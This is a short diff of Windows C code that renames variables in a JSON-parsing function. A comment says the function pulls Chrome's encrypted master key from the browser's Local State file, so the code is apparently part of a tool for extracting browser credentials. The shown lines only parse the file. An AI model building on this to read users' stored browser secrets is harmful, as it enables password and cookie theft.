@@ -20,7 +20,7 @@ BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_st
 }
 
 // Gets the Master Key of Chrome, which is inside "%LOCALAPPDATA%\Google\Chrome\User Data\Local State" and store it in [PWCHAR] enc_master_key
-BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PWCHAR enc_master_key, WORD enc_master_key_size, PSTR buf_outMsg, DWORD buf_outSize) {	
+BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PWCHAR out_buffer, WORD size_out_buffer, PSTR buf_outMsg, DWORD buf_outSize) {	
 	errno_t err;
 
 	/* Copy path to temporary buffer */
@@ -45,7 +45,7 @@ BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PW
 		Debug(sprintf_s(buf_outMsg, buf_outSize * sizeof(CHAR), "get_json_property: _wfopen_s: Opening '%ws' file error code: %d:%d\n", data_file, err, errno);)
 	}
 	if (fp_file == NULL) {
-		_wcserror_s(enc_master_key, enc_master_key_size, err);
+		_wcserror_s(out_buffer, size_out_buffer, err);
 		return FALSE;
 	}
 
@@ -61,8 +61,8 @@ BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PW
 			}
 			else {
 				quoteFound = FALSE;
-				if (!wcscmp(enc_master_key, property)) {
-					wmemset(enc_master_key, L'\0', enc_master_key_size);
+				if (!wcscmp(out_buffer, property)) {
+					wmemset(out_buffer, L'\0', size_out_buffer);
 					i = 0;
 					propertyFound = TRUE;
 					continue;
@@ -73,14 +73,14 @@ BOOL get_json_property(PCWSTR browser_dir, PCWSTR data_file, PCWSTR property, PW
 					}
 					return TRUE;
 				}
-				enc_master_key[i] = L'\0';
-				wmemset(enc_master_key, L'\0', enc_master_key_size);
+				out_buffer[i] = L'\0';
+				wmemset(out_buffer, L'\0', size_out_buffer);
 				i = 0;
 			}
 		}
 		else if (quoteFound) {
-			enc_master_key[i] = read_buffer[0];
-			i = (i + 1) % (enc_master_key_size - 1);
+			out_buffer[i] = read_buffer[0];
+			i = (i + 1) % (size_out_buffer - 1);
 		}
 	}
 
